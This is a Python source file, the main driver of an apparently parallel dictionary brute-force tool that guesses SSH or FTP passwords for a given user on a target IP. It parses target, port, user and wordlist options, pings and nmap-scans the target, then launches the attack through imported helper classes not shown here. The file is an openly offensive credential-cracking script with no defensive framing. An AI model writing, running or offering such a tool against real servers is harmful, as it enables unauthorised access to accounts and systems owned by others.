import multiprocessing as mp
from multiprocessing import Value, Lock
import paramiko
import time
import optparse
from network_tools import *
from connection_tools import *

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", \
            help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", \
            help="user name on the server")
    parser.add_option("-j", "--processes", dest="num_processes", \
            help="number of processes to launch in parallel", default= mp.cpu_count())
    parser.add_option("-p", "--protocol", dest="protocol", \
            help="Protocol you want to use (SSH, FTP...)", default='ssh')
    parser.add_option("-P", "--port", dest="port", \
            help="Port on which you want to run the attack", default=22)
    parser.add_option("-f", "--file", dest="password_file", \
            help="Dictionnary where the list of password is stored")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    elif not options.password_file:
        parser.error("[-] Please specify a dictionnary file, use --help for more info")
    return options 

if __name__ == '__main__':

    #retrieving options
    options = get_arguments()

    #Creating a NetworkTools object, to inspect
    #if the network request is consistent
    network_info = NetworkTools(options.target, \
            options.port, options.protocol)

    #Checking if the server can be pinged and 
    #if the protocol is consistent
    network_info.get_ping()
    network_info.get_nmap()

    if (not network_info.get_network_status()):
        print('Exiting the program due to network problem')
        exit(0)
    
    
    #Create the connection object
    connection = ConnectionTools(options.user, options.target, \
            options.port, options.protocol, options.num_processes,\
            options.password_file) 

    #printer start-up baneer
    connection.print_attack()

    t1 = time.time()
    connection.run()

    print("Execution time: " + str (time.time() - t1))




